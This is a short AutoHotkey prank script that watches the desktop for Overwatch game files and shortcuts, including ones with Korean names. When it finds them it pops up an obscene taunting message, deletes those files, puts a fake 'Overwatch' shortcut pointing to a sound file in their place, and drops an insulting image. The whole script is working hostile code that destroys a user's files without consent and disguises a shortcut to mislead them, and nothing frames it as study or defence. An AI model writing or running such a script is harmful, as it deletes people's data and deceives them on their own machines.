Start:
incrname = 0
CheckForFile:
IfExist, %A_Desktop%\*overwatch*.*
MsgBox, no you didn't 凸(-_-)凸
Goto, Payload
IfNotExist, %A_Desktop%\*overwatch*.*
Goto, Start
Payload:
FileCopy, lol.wav, C:\lol.wav, 1
FileCopy, overwch.ico, C:\overwch.ico, 1
FileDelete, %A_Desktop%\*overwatch*.*
FileDelete, %A_Desktop%\*오버워치*.*
FileCreateShortcut, C:\lol.wav, %A_Desktop%\Overwatch.lnk, , , Start Overwatch, C:\overwch.ico, ,
FileCopy, failstar.png, %A_Desktop%\I-am-an-asshole.png, 1
Pause
ESC::ExitApp
